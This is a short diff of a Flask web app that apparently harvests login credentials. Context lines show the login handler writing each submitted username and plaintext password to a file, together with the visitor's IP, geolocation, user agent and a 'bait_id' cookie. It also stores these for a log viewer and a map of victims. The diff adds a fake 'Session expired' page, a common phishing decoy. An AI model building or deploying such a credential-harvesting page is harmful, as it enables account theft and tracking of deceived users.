@@ -2,7 +2,6 @@ from flask import Flask, request, render_template, make_response
 from datetime import datetime
 import requests
 import json
-import os
 
 app = Flask(__name__)
 
@@ -40,7 +39,6 @@ def login():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     loc = get_location(ip)
 
-    # Log to file
     with open("logins.txt", "a") as file:
         file.write(f"\n[Login Attempt - {timestamp}]\n")
         file.write(f"Username: {username} | Password: {password}\n")
@@ -50,7 +48,6 @@ def login():
         file.write(f"User-Agent: {user_agent} | Cookie: {bait_id}\n")
         file.write("-" * 50 + "\n")
 
-    # Save to JSON for web log viewer
     try:
         with open("data.json", "r") as f:
             data = json.load(f)
@@ -104,5 +101,6 @@ def map_view():
     coords = [{"loc": x["loc"], "ip": x["ip"], "city": x["city"]} for x in data if x["loc"] != "0,0"]
     return render_template("map.html", coords=coords)
 
-if __name__ == '__main__':
-    app.run(debug=True)
+@app.route('/session_expired')
+def expired():
+    return "<h3 style='text-align:center;'>Session expired. Please try again later.</h3>"
